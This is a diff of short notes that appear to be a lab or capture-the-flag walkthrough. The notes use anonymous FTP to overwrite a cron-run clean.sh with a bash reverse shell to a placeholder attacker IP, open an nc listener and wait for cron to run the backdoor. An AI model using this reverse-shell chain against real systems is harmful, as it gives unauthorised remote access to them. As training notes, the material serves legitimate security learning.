@@ -1,15 +1,19 @@
--------
-ftp anon login 
-found clean.sh that is being rn as a cron job
-
-  replace the clean.sh w/ 
-             #!/bin/bash
-             bash -i >& /dev/tcp/[Your-IP-Address]/[PORT] 0>&1
-
-  set listnener on attacker computer
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+FTP Anonymous Login          .sh found being executed w/ cron job    Get SHELL, upgrade SHELL, ESCALATE w/ LinPEAS
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+1.) Found clean.sh that is being rn as a cron job
+                a.) replace the clean.sh w/ 
+                                                #!/bin/bash
+                                                bash -i >& /dev/tcp/[Your-IP-Address]/[PORT] 0>&1
+                b.) change clean.sh to be executeable 
+                c.) chmod +x clean.sh
+                
+2.) Set listnener on attacker computer
               nc -lvnp [Same-Port-as-reverse-shell]
 
-change clean.sh to be executeable 
-              chmod +x clean.sh
-log into ftp anf put file
+3.) log into ftp anf put file
               put clean.sh
+              
+...wait for cron job to run the backdoor...              
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
